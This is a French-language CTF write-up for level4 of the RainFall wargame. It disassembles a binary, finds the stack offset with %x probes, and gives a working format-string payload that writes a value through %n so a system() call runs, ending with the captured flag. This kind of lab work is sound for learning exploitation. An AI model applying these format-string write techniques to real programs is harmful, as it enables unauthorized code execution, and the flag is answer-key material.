(gdb) disass n
Dump of assembler code for function n:
  0x08048457 <+0>:	push   %ebp
  0x08048458 <+1>:	mov    %esp,%ebp
  0x0804845a <+3>:	sub    $0x218,%esp
  0x08048460 <+9>:	mov    0x8049804,%eax
  0x08048465 <+14>:	mov    %eax,0x8(%esp)
  0x08048469 <+18>:	movl   $0x200,0x4(%esp)
  0x08048471 <+26>:	lea    -0x208(%ebp),%eax
  0x08048477 <+32>:	mov    %eax,(%esp)
  0x0804847a <+35>:	call   0x8048350 <fgets@plt>
  0x0804847f <+40>:	lea    -0x208(%ebp),%eax
  0x08048485 <+46>:	mov    %eax,(%esp)
  0x08048488 <+49>:	call   0x8048444 <p>
  0x0804848d <+54>:	mov    0x8049810,%eax
  0x08048492 <+59>:	cmp    $0x1025544,%eax
  0x08048497 <+64>:	jne    0x80484a5 <n+78>
  0x08048499 <+66>:	movl   $0x8048590,(%esp)
  0x080484a0 <+73>:	call   0x8048360 <system@plt>
  0x080484a5 <+78>:	leave
  0x080484a6 <+79>:	ret
End of assembler dump.
(gdb) disass p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x8(%ebp),%eax
   0x0804844d <+9>:	mov    %eax,(%esp)
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave
   0x08048456 <+18>:	ret
End of assembler dump.


On remarque un fgets non exploitable mais un appel a printf qui comme vu precedement est exploitable
On va essayer de passer la comparaison
  0x08048492 <+59>:	cmp    $0x1025544,%eax
pour avoir acces a notre system en +73.
On observe avec des breakpoint que la fonction p retourne la longueur de la chaine que l'on envoie et
la stock dans eax. Cependant eax va ensuite prendre la valeur de 0x8049810 qui lui contient la variable m vide
on comprend donc qu'il va faloir remplir m en fesant un overflow sur le printf pour pouvoir passer la comparaison
a 0x1025544 qui vaux 16930116

level4@RainFall:~$ ./level4
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x
AAAA b7ff26b0 bffff684 b7fd0ff4 0 0 bffff648 804848d bffff440 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825

Notre offset est donc a 12
0x8049810 etant l'adresse de notre variable et sachant l'offset
il ne nous reste plus qu'a exploiter %n comme precedemment pour ecrire 16930116 dans m.

(python -c 'print "\x10\x98\x04\x08" + 16930112*"A"+ "%12$n"'; cat) | ./level4
ï¿½raceback (most recent call last):
  File "<string>", line 1, in <module>
IOError: [Errno 32] Broken pipe

Petit soucis reglable avec le %XXd qui va remplir XX d'espace vide

(python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"') | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
